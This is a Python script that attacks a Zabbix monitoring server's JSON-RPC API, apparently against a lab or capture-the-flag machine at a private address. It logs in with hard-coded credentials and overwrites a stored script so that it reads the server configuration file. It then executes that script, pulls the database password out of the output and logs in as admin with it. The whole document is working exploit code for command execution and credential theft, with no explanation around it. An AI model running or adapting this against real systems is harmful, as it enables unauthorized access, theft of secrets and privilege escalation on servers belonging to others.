import requests
import json
import readline

from pip._vendor.distlib.compat import raw_input

ZABIX_ROOT = 'http://10.10.10.108/zabbix'
url = ZABIX_ROOT + '/api_jsonrpc.php'

login = 'zapper'
password = 'zapper'
hostid = '10106'

auth_payload = {
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
        'user': "" + login + "",
        'password': "" + password + "",
    },
    "auth": None,
    "id": 0,
}

headers = {
    'content-type': 'application/json',
}

auth = requests.post(url, data=json.dumps(auth_payload), headers=(headers))
print(auth.text)
auth = auth.json()

auth_payload = {
    "jsonrpc": "2.0",
    "method": "script.update",
    "params": {
        "scriptid": "1",
        # "execute_on": 0,
        "command": "cat /etc/zabbix/zabbix_server.conf"
    },
    "auth": auth['result'],
    "id": 0,
}

cmd_upd = requests.post(url, data=json.dumps(auth_payload), headers=(headers))
auth_payload = {
    "jsonrpc": "2.0",
    "method": "script.execute",
    "params": {
        "scriptid": "1",
        "hostid": "" + hostid + ""
    },
    "auth": auth['result'],
    "id": 0,
}

cmd_exe = requests.post(url, data=json.dumps(auth_payload), headers=(headers))
cmd_exe = cmd_exe.json()
if "error" in cmd_exe:
    print(cmd_exe)
    exit()

command_result = cmd_exe["result"]["value"]
result = [line for line in command_result.split('\n') if "DBPassword" in line]
admin_password = result[2].split("=")[1]
print("Zabbix admin password: " + admin_password)


admin_payload = {
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
        'user': "admin",
        'password': admin_password,
    },
    "auth": None,
    "id": 0,
}

auth = requests.post(url, data=json.dumps(admin_payload), headers=(headers))
print(auth.text)
auth = auth.json()